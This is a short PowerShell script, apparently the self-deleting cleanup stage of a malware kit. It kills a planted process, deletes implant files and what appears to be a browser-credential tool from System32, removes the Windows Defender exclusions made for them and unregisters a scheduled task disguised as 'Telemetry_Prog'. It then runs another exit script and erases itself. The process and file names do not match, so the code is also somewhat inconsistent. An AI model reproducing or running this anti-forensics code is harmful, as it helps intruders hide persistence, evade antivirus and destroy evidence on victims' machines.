# force stops the exe file
Stop-Process -Name "N0b0dy.exe" -Force
# removes the files
Remove-Item -Path "C:\Windows\System32\N0body.exe" -Force
Remove-Item -Path "C:\Windows\System32\temp.ps1" -Force
Remove-Item -Path "C:\Windows\System32\ddrcc.ps1" -Force
Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
# remove exclusions
Remove-MpPreference -ExclusionPath "C:\Windows\System32\N0body.exe" -Force
Remove-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1" -Force
Remove-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe" -Force
# removes scheduled task
Unregister-ScheduledTask -TaskName "Telemetry_Prog" -Confirm:$false
# start final cleanup file
& "C:\Windows\System32\exitstrat.ps1"
# self destruct file
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
